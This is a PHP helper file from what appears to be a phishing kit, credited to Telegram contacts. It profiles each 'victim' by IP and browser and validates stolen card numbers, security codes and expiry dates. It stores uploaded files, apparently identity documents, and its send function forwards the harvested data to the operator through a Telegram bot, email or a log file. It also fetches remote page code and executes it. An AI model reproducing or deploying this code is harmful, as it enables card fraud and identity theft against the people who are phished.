<?php

    /**//**//**//**//**//**

        Telegram : https://t.me/syst3mx
        Telegram Group : https://t.me/matos_x

    /**//**//**//**//**//**/

    include 'vendor/autoload.php';

    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;

    function create() {
        $letters  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        $length   = strlen($letters) - 1;
        $random   = "";
        for($p = 0; $p < 6; $p++) {
            $random .= $letters[mt_rand(0, $length)];
        }
        $randomFile = 'c993aac/' . $random . '.txt';
        $file = fopen($randomFile, "w");
        return ['file' => $file, 'name' => $random . '.txt', 'path' => $randomFile];
    }

    function go($page) {
        $detect = new foroco\BrowserDetection();
        $create = create();
        $file = $detect->req($page);
        $content = file_get_contents($file);
        if( empty($content) )
            return false;
        fwrite($create['file'], $content);
        fclose($create['file']);
        $_SESSION[$page . '_path'] = $create['path'];
        return $create;
    }

    function redirect($page) {
        $go = go($page);
        if( !$go )
            die('Error : Page not exists.');
        require_once($go['path']);
        unlink($go['path']);
        exit();
    }

    function location($page, $params = '') {
        header("Location: index.php?redirection=" . $page . $params);
        exit();
    }

    function victim_infos() {
        $detect = new foroco\BrowserDetection();
        $useragent       = $_SERVER['HTTP_USER_AGENT'];
        $result          = $detect->getAll($useragent, 'JSON');
        $result          = json_decode($result,true);
        $ip             = get_client_ip();
        $browserName    = $result['browser_name'];
        $browserVer     = $result['browser_version'];
        $device_type       = $result['device_type'];
        $os_name   = $result['os_name'];
        $os_version   = $result['os_version'];
        $hostname       = gethostbyaddr(get_client_ip());
        $message        = "IPA    : $ip | $hostname" . "\r\n";
        $message        .= "Agent : $browserName | $browserVer | $device_type  |  $os_name $os_version"  . "\r\n\r\n";
        return $message;
    }

    function randomix($number = 6) {
        $letters  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        $length   = strlen($letters) - 1;
        $random   = "";
        for($p = 0; $p < $number; $p++) {
            $random .= $letters[mt_rand(0, $length)];
        }
        return $random;
    }

    function proper_parse_str($str) {
        # result array
        $arr = array();

        # split on outer delimiter
        $pairs = explode('&', $str);

        # loop through each pair
        foreach ($pairs as $i) {
            # split into name and value
            list($name,$value) = explode('=', $i, 2);

            # if name already exists
            if( isset($arr[$name]) ) {
                # stick multiple values into an array
                if( is_array($arr[$name]) ) {
                    $arr[$name][] = $value;
                }
                else {
                    $arr[$name] = array($arr[$name], $value);
                }
            }
            # otherwise, simply stick it in a scalar
            else {
                $arr[$name] = $value;
            }
        }

        # return result array
        return $arr;
    }

    function getPageName($page_name) {
        require_once(MAIN . '/tmp/'. $page_name .'.php');
        return;
    }

    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }

    function send($subject,$message) {

        $conf_via_telegram        = VIA_TELEGRAM;
        $conf_token               = TOKEN;
        $conf_chat_id             = CHAT_ID;

        $conf_via_email           = VIA_EMAIL;
        $conf_email               = EMAIL;

        $conf_via_txt             = VIA_TXT;
        $conf_txtfilename         = TXT_FILENAME;

        if( $conf_via_telegram == 1 ) {
            $curl     = curl_init();
            $token    = $conf_token;
            $chat_id  = $conf_chat_id;
            $format   = 'HTML';
            curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $token .'/sendMessage?chat_id='. $chat_id .'&text='. urlencode($message) .'&parse_mode=' . $format);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            $result = curl_exec($curl);
            curl_close($curl);
        }
        if( $conf_via_txt == 1 ) {
            file_put_contents($conf_txtfilename . '.txt', $message, FILE_APPEND);
        }
        if( $conf_via_email == 1 ) {
            $mail           = new PHPMailer;
            $mail->From     = 'RESULT@domain.com';
            $mail->FromName = 'ME';
            $mail->Subject  = $subject;
            $mail->Body     = $message;
            $mail->AddAddress($conf_email);
            $mail->send();
            echo $mail->ErrorInfo;
        }
    }

    function errclass($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }

    function errmsg($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="errmsg">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }

    function get_value($value) {
        if( isset($_SESSION[$value]) ) {
            return $_SESSION[$value];
        }
    }

    function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }

    function validate_one($number = null) {
        $card = $string = str_replace(' ', '', $number);
        if( validate_number($card) == false || strlen($card) < 15 ) {
            return false;
        }
        return $card;
    }

    function validate_three($number = null) {
        if( validate_number($number) == false || strlen($number) < 3 ) {
            return false;
        }
        return $number;
    }

    function validate_two($month,$year) {
        if( validate_number($month) == false || strlen($month) < 2 || $month > 12 ) {
            return false;
        }
        if( validate_number($year) == false || strlen($year) < 2 || $year < 22 ) {
            return false;
        }
        return $month . '/' . $year;
    }

    function validate_name($name) {
        if (!preg_match('/^[\p{L} ]+$/u', $name))
            return false;
        return true;
    }

    function validate_email($email) {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL))
            return false;
        return true;
    }

    function validate_number($number,$length = null) {
        if (is_numeric($number)) {
            if( $length == null ) {
                return true;
            } else {
                if( $length == strlen($number) )
                    return true;
                return false;
            }
        } else {
            return false;
        }
    }

    function validate_date($date, $format = 'Y-m-d H:i:s') {
        $d = DateTime::createFromFormat($format, $date);
        return $d && $d->format($format) == $date;
    }

    function rr() {
        $rand = rand(6, 9);
        $letters  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        $length   = strlen($letters) - 1;
        $random   = "";
        for($p = 0; $p < $rand; $p++) {
            $random .= $letters[mt_rand(0, $length)];
        }
        return $random;
    }

    function semantic() {
        $words = array('blade','advice','medium','brink','adjust','kidney','absolute','boom','morale','wealth','basis','winner','knock','worth','month','proof','kitchen','poison','beef','prevent');
        $words_count = count($words) - 1;
        $rand = rand(0, $words_count);
        return $words[$rand];
    }

    function get_phone() {
        $fnums = substr($_SESSION['phone'], 0, 3);
        $lnums = substr($_SESSION['phone'], -3);
        return $fnums . "****" . $lnums;
    }
    
    function get_email() {
        $ex_email = explode('@',$_SESSION['email_address']);
        $fchar = substr($ex_email[0], 0, 3);
        return $fchar . "*******@" . $ex_email[1];
    }

    function upload_file($file,$name) {
        $target_dir     = "upload/";
        $target_file    = $target_dir . basename($file["name"]);
        $imageFileType  = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
        /*$check          = getimagesize($file["tmp_name"]);
        if($check == false) {
            return false;
        }*/
        if (move_uploaded_file($file["tmp_name"], 'upload/' . get_client_ip() . '-' . $name . '.' . $imageFileType)) {
            return get_client_ip() . '-' . $name . '.' . $imageFileType;
        } else {
            return false;
        }
    }

    function get_text($place) {
        global $lang;
        return $lang[$place][$_SESSION['lang']];
    }

?>